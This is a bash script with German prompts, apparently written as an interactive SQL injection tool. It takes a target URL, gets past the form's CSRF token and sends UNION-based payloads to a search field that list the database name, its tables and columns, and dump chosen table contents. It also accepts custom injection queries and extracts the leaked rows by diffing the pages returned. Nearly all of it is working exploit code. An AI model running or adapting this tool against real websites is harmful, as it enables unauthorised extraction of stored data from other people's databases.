#!/bin/bash

urlencode() {
  local encoded=""
  local length="${#1}"
  for (( i=0; i<length; i++ )); do
    local c="${1:i:1}"
    case $c in
      [a-zA-Z0-9.~_-]) encoded+="$c" ;;
      *) printf -v hex '%X' "'$c"; encoded+="%$hex"; ;;
    esac
  done
  echo "$encoded"
}

get_csrf_token() {
  curl -c cookies.txt -s "$1" | grep -oP 'name="_token" value="\K[^"]+'
}

send_request() {
  local sql_injection="$1"
  local response_file="$2"
  local token=$(get_csrf_token "$url")

  curl -s -b cookies.txt -e "$url" \
    -H 'Content-Type: application/x-www-form-urlencoded' \
    -d "_token=$token&search=$sql_injection" \
    "$url" > "$response_file"
}

compare_responses() {
  local without_query_file="$1"
  local with_query_file="$2"
  local diff_file="$3"

  diff --unified "$without_query_file" "$with_query_file" > "$diff_file"
}

extract_data() {
  # Entferne Leerzeichen zu Beginn und Ende jeder Zeile und entferne das '+' Zeichen.
  grep -oP '^\+.*?(?<=<li>).*(?=</li>)' "$1" | sed 's/^\+\s*//' | sed 's/<[^>]*>//g' | sed 's/^[[:blank:]]*//;s/[[:blank:]]*$//'
}

# Aufforderung zur Eingabe der URL, falls nicht bereits gesetzt
if [ -z "$url" ]; then
  read -p "Bitte geben Sie die vollständige URL ein (inklusive https://): " url
fi

# Speichere die ursprüngliche Antwort ohne SQL-Injection
send_request "" "response_without_query.html"

while :; do
  echo "Wähle den Typ des SQL-Injections oder beende das Skript:"
  echo "1 - Datenbankname"
  echo "2 - Alle Tabellennamen"
  echo "3 - Abfrage Tabelle"
  echo "4 - Eigene Query"
  echo "5 - Beenden"
  read -p "Auswahl (1/2/3/4/5): " choice

  case $choice in
    1)
      sql_injection="1' union select 1,database()#"
      ;;
    2)
      sql_injection="1' and 1=2 union select 1,group_concat(table_name) from information_schema.tables where table_schema = database()#"
      ;;
    3)
      read -p "Welche Tabelle soll abgefragt werden: " table
      sql_injection="1' UNION SELECT null,GROUP_CONCAT(column_name SEPARATOR ', ') FROM information_schema.columns WHERE table_name = '$table'#"
      encoded_sql_injection=$(urlencode "$sql_injection")
      send_request "$encoded_sql_injection" "response_with_columns.html"
      compare_responses "response_without_query.html" "response_with_columns.html" "changes.diff"
      column_names=$(extract_data "changes.diff")
      echo -e "Gefundene Spalten: \033[32m$column_names\033[0m"
      read -p "Bitte geben Sie die Spalten an, die abgefragt werden sollen (getrennt durch Komma): " columns
      sql_injection="1' UNION SELECT null, CONCAT_WS(' | ', $columns) FROM $table #"
      ;;
    4)
      read -p "Eigene SQL-Injection-Abfrage eingeben: " custom_query
      sql_injection=$custom_query
      ;;
    5)
      echo "Skript wird beendet."
      exit 0
      ;;
    *)
      echo "Ungültige Auswahl."
      continue
      ;;
  esac

  encoded_sql_injection=$(urlencode "$sql_injection")
  send_request "$encoded_sql_injection" "response_with_query.html"
  compare_responses "response_without_query.html" "response_with_query.html" "changes.diff"

  read -p "Möchtest du die gesamte Differenz (d) oder nur die extrahierten Daten (e) sehen? (d/e) [e]: " -i "e" output_choice
  output_choice=${output_choice:-e}

  if [ "$output_choice" = "e" ]; then
    extract_data "changes.diff" | sed $'s/^/\x1b[32m/' | sed $'s/$/\x1b[0m/'
    echo -e "Inject-Query: \033[31m$sql_injection\033[0m"

  elif [ "$output_choice" = "d" ]; then
    cat "changes.diff"
    echo -e "Inject-Query: \033[31m$sql_injection\033[0m"
  else
    echo "Ungültige Auswahl."
  fi

  echo "Drücken Sie eine beliebige Taste, um fortzufahren..."
  read -n 1 -s
done
